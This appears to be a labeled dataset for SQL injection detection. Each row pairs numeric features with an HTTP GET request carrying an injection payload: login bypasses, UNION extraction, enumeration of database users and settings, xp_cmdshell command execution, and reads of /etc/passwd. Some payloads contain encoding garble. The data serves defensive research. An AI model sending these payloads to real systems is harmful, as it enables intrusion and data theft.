+55,1,200,2786,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
+55,1,200,2882,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
+55,1,200,3968,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
+55,1,200,3028,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
+55,1,200,2737,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
+37,1,200,7937,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
+37,1,200,5212,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
+37,1,200,3646,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
+37,1,200,1463,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
+37,1,200,6282,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
+37,1,200,6093,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
+37,1,200,6179,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
+37,1,200,2689,7,19,4,1,0,GET ?id=select current_user; HTTP/1.1
+51,1,200,5026,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
+51,1,200,6591,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
+51,1,200,1505,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
+51,1,200,1251,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
+51,1,200,6126,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
+51,1,200,6422,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
+18,1,200,3026,7,2,4,1,1,GET ?id=' HTTP/1.1
+26,1,200,7547,7,7,4,2,1,GET login/?id=" # HTTP/1.1
+44,1,200,3168,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
+44,1,200,4181,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
+26,1,200,6425,7,7,6,2,1,GET login/?id='^' HTTP/1.1
+26,1,200,7659,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
+61,1,200,7788,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
+61,1,200,3179,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
+61,1,200,7064,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
+61,1,200,2028,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
+62,1,200,4854,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+62,1,200,7518,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+62,1,200,2212,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+62,1,200,7346,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
+20,1,200,2224,7,2,6,1,1,GET ?id='-- HTTP/1.1
+48,1,200,1489,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,5031,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,6610,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,6412,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,7984,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,5751,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,1306,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,1279,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,3678,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,2193,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,1537,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,2301,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+48,1,200,7929,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
+43,1,200,2513,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
+43,1,200,3793,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
+43,1,200,4105,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
+43,1,200,3120,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
+43,1,200,3769,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
+20,1,200,4134,7,2,5,1,1,GET ?id=' # HTTP/1.1
+20,1,200,5735,7,2,5,1,1,GET ?id=' # HTTP/1.1
+43,1,200,6203,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
+43,1,200,5165,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
+69,1,200,4935,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+69,1,200,2024,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+69,1,200,1036,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+69,1,200,5655,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+69,1,200,6208,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+69,1,200,6203,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+69,1,200,1738,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+69,1,200,1263,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+25,1,200,5832,7,4,5,1,1,GET ?id=' or 1=1 HTTP/1.1
+25,1,200,1521,7,4,5,1,1,GET ?id=' or 1=1 HTTP/1.1
+46,1,200,4735,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
+46,1,200,3527,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
+46,1,200,2255,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
+87,1,200,3794,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
+87,1,200,4907,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
+28,1,200,2764,7,6,4,1,1,GET ?id=" or "a"="a HTTP/1.1
+28,1,200,4327,7,6,4,1,1,GET ?id=" or "a"="a HTTP/1.1
+43,1,200,2562,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
+43,1,200,2794,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
+43,1,200,5215,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
+38,1,200,1790,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
+38,1,200,7080,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
+31,1,200,1524,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
+59,1,200,7265,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+59,1,200,6184,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+59,1,200,5340,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+59,1,200,4810,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+59,1,200,6189,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+37,1,200,7863,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
+37,1,200,4085,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
+33,1,200,6025,7,10,8,1,1,GET ?id=' or 'one'='one¡V HTTP/1.1
+33,1,200,7330,7,10,8,1,1,GET ?id=' or 'one'='one¡V HTTP/1.1
+38,1,200,3757,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
+38,1,200,3952,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
+38,1,200,4907,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
+38,1,200,7976,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
+33,1,200,6021,7,9,4,1,1,GET ?id=admin" or "1"="1 HTTP/1.1
+37,1,200,6780,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
+37,1,200,1525,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
+38,1,200,2275,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
+38,1,200,4954,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
+33,1,200,6847,7,9,5,3,1,GET login/?id=" or 1=1/* HTTP/1.1
+58,1,200,6638,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
+58,1,200,1083,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
+58,1,200,4397,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
+58,1,200,7434,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
+58,1,200,1127,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
+39,1,200,2915,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
+39,1,200,4817,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
+39,1,200,3005,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
+37,1,200,7559,7,9,11,2,1,GET login/?id=') or '1'='1-- HTTP/1.1
+49,1,200,7397,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
+26,1,200,1557,7,7,4,3,1,GET login/?id="/* HTTP/1.1
+26,1,200,3912,7,7,4,3,1,GET login/?id="/* HTTP/1.1
+40,1,200,7909,7,14,9,2,1,GET login/?id=admin') or '1'='1 HTTP/1.1
+32,1,200,7533,7,9,4,2,1,GET login/?id=" or ""^" HTTP/1.1
+32,1,200,6810,7,9,4,2,1,GET login/?id=" or ""^" HTTP/1.1
+20,1,200,2026,7,2,6,1,1,GET ?id='*' HTTP/1.1
+88,1,200,6319,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
+27,1,200,2536,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
+27,1,200,7686,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
+27,1,200,5635,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
+65,1,200,6452,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,6510,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,2731,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,5912,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,1462,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,4075,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,3614,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,4161,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,6557,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+65,1,200,3694,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
+52,1,200,1166,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
+52,1,200,1483,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
+52,1,200,7505,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
+52,1,200,6627,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
+52,1,200,6960,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
+52,1,200,3229,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
+52,1,200,3173,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
+52,1,200,3737,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
+58,1,200,3062,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+58,1,200,6350,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+58,1,200,1488,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+58,1,200,4914,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+58,1,200,2754,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+58,1,200,4893,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+58,1,200,6791,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+58,1,200,2236,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
+20,1,200,5616,7,2,4,1,1,GET ?id=' ¡V HTTP/1.1
+20,1,200,6181,7,2,4,1,1,GET ?id=' ¡V HTTP/1.1
+37,1,200,2167,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
+37,1,200,7188,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
+37,1,200,5755,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
+37,1,200,4921,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
+37,1,200,6798,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
+46,1,200,1603,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
+46,1,200,4579,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
+46,1,200,1402,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
+46,1,200,7189,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
+35,1,200,6512,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
+35,1,200,7086,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
+81,1,200,6412,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+81,1,200,6415,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+81,1,200,2249,24,15,4,1,1,GET ?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+91,1,200,4273,24,20,4,1,1,GET ?id=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+91,1,200,5111,24,20,4,1,1,GET ?id=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+91,1,200,7457,24,20,4,1,1,GET ?id=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+91,1,200,1275,24,20,4,1,1,GET ?id=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+28,1,200,6739,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
+26,1,200,7837,7,4,6,1,2,GET ?id= or 1=1-- HTTP/1.1
+45,1,200,7425,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
+45,1,200,3136,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
+45,1,200,5609,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
+58,1,200,2207,21,16,10,1,1,GET ?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
+49,1,200,2738,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
+49,1,200,7925,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
+49,1,200,4623,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
+49,1,200,7772,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
+42,1,200,2492,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
+42,1,200,3906,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
+42,1,200,5053,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
+42,1,200,1682,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
+42,1,200,6705,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
+28,1,200,1416,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
+28,1,200,6445,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
+28,1,200,6206,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
+74,1,200,6124,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
+74,1,200,1619,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
+74,1,200,5856,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
+97,1,200,5255,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+97,1,200,3125,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+32,1,200,5880,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
+80,1,200,5615,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
+80,1,200,7278,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
+80,1,200,7184,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
+80,1,200,4459,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
+39,1,200,2305,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
+39,1,200,7581,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
+39,1,200,2874,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
+39,1,200,1237,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
+39,1,200,7920,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
+39,1,200,6644,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
+49,1,200,2750,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
+49,1,200,1104,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
+49,1,200,3353,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
+49,1,200,4714,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
+42,1,200,2031,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
+42,1,200,4652,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
+42,1,200,6353,7,11,12,2,1,GET login/?id=")) or (("x"))=(("x HTTP/1.1
+58,1,200,1916,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
+58,1,200,7111,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
+58,1,200,7350,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
+58,1,200,5336,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
+58,1,200,5113,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
+32,1,200,7585,7,9,3,2,1,GET login/?id=" or "" " HTTP/1.1
+26,1,200,2615,7,4,4,1,1,GET ?id=" or ""*" HTTP/1.1
+26,1,200,1417,7,4,4,1,1,GET ?id=" or ""*" HTTP/1.1
+64,1,200,4385,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
+64,1,200,6406,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
+64,1,200,5428,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
+64,1,200,6013,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
+64,1,200,2857,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
+64,1,200,2958,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
+31,1,200,1496,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
+31,1,200,5390,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
+31,1,200,5249,7,4,6,1,1,GET ?id=" or "1"="1"-- HTTP/1.1
+56,1,200,4303,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
+56,1,200,1636,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
+56,1,200,4380,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
+56,1,200,4199,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
+56,1,200,6251,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
+56,1,200,6161,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
+55,1,200,1188,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
+55,1,200,3639,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
+55,1,200,3905,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
+55,1,200,3221,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
+55,1,200,1070,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
+27,1,200,7903,7,4,4,1,1,GET ?id=" or 1=1 ¡V HTTP/1.1
+43,1,200,7425,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
+43,1,200,3998,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
+43,1,200,6458,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
+43,1,200,4868,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
+43,1,200,5116,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
+31,1,200,5620,7,12,4,2,1,GET login/?id=admin" # HTTP/1.1
+31,1,200,4551,7,12,4,2,1,GET login/?id=admin" # HTTP/1.1
+49,1,200,2326,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
+49,1,200,5987,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
+49,1,200,5195,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
+49,1,200,3457,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
+49,1,200,7935,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
+49,1,200,2651,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
+49,1,200,1805,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
+49,1,200,1978,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
+50,1,200,3874,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
+50,1,200,1904,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
+26,1,200,7132,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
+19,1,200,3030,7,2,5,1,0,GET ?id=== HTTP/1.1
+19,1,200,2931,7,2,5,1,0,GET ?id=== HTTP/1.1
+38,1,200,3207,7,9,13,1,1,GET ?id=admin') or ('1'='1'-- HTTP/1.1
+37,1,200,2274,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
+58,1,200,1840,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
+58,1,200,3147,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
+38,1,200,2786,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
+26,1,200,4102,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
+57,1,200,6972,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
+57,1,200,1335,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
+57,1,200,5472,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
+57,1,200,1971,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
+26,1,200,5866,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
+26,1,200,3778,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
+31,1,200,1388,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
+31,1,200,1875,7,9,6,2,1,GET login/?id='or'1=1¡¬ HTTP/1.1
+25,1,200,6191,7,4,6,1,2,GET ?id=or 1=1-- HTTP/1.1
+25,1,200,5545,7,4,6,1,2,GET ?id=or 1=1-- HTTP/1.1
+32,1,200,6501,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
+31,1,200,2284,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
+31,1,200,4935,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
+31,1,200,6466,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
+31,1,200,4580,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
+39,1,200,3704,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,2011,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,2866,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,7932,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,1865,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,1431,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,2162,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,3202,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,1849,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+39,1,200,6012,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
+51,1,200,5307,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
+51,1,200,3897,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
+51,1,200,2411,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
+91,1,200,4548,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+91,1,200,6239,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+36,1,200,6110,7,11,6,2,1,GET login/?id=") or ("a"="a HTTP/1.1
+69,1,200,7459,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
+69,1,200,4305,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
+69,1,200,2030,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
+69,1,200,2126,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
+69,1,200,5501,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
+69,1,200,2921,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
+56,1,200,7514,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
+40,1,200,5370,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
+40,1,200,4610,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
+40,1,200,3942,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
+40,1,200,6048,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
+40,1,200,1315,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
+40,1,200,2058,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
+40,1,200,2899,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
+55,1,200,5998,7,28,7,2,1,GET login/?id=' group by username having 1=1-- HTTP/1.1
+63,1,200,1546,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
+63,1,200,5868,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
+63,1,200,2664,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
+30,1,200,4668,7,6,6,1,1,GET ?id=") or ("a"="a HTTP/1.1
+30,1,200,5933,7,6,6,1,1,GET ?id=") or ("a"="a HTTP/1.1
+63,1,200,5600,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+63,1,200,1238,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+63,1,200,1789,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
